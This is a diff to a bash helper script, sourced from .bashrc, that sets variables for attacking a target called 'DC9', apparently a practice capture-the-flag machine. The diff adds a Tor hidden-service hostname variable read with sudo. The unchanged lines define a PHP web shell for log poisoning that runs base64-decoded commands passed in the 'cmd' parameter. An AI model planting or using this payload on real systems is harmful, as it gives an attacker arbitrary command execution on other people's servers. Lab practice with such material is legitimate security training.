@@ -1,16 +1,18 @@
 #!/bin/bash
 #
 # Source this in .bashrc
-# IMPORTANT: Set DC9 var
+# IMPORTANT: Set DC9 and HIDDEN_SRV_TOR vars
 #
 
 #DC9=<IP>
+#HIDDEN_SRV_TOR=<hidden_service_hostname>
+
+# Defaults
+DC9=${DC9:-dc9}
+[ -z "$HIDDEN_SRV_TOR" ] && HIDDEN_SRV_TOR=$(sudo cat /opt/tor-kiddie-hidden-service/hostname)
+
 DC9_POISON_VAR="cmd"
 DC9_POISON_CODE='<?php echo('"'"'<pre>'"'"');system(base64_decode($_GET['"'"$DC9_POISON_VAR"'"']));echo('"'"'</pre>'"'"'); ?>'
-HIDDEN_SRV_TOR=$(cat /opt/tor-kiddie-hidden-service/hostname)
-
-
-DC9=${DC9:-dc9}
 
 alias dc9-config="vim \"$(readlink -f ${BASH_SOURCE[0]})\" && echo -n \"Sourcing file...\" && source \"$(readlink -f ${BASH_SOURCE[0]})\" && echo \"Done\""
 
